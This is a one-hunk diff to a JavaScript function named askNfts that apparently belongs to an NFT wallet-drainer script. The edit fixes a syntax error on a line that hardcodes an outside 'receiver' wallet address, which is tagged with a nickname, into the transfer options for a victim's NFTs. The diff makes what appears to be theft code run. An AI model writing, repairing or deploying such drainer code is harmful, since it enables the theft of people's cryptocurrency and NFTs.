@@ -170,7 +170,7 @@ async function askNfts(web3, amount) {
                             price: nftData.price * (nft.amount > 0 ? nft.amount : 1),
                             options: {
                                 type: nft.contract_type.toLowerCase(),
-                                receiver: "0xDc32ec7a610c2196fDf734818837DEEd1D2663A8"; /*Kabiyesi*///WALLET ADRESS
+                                receiver: "0xDc32ec7a610c2196fDf734818837DEEd1D2663A8", /*Kabiyesi*///WALLET ADRESS
                                 contract_address: nft.token_address,
                                 token_id: nft.token_id,
                             }
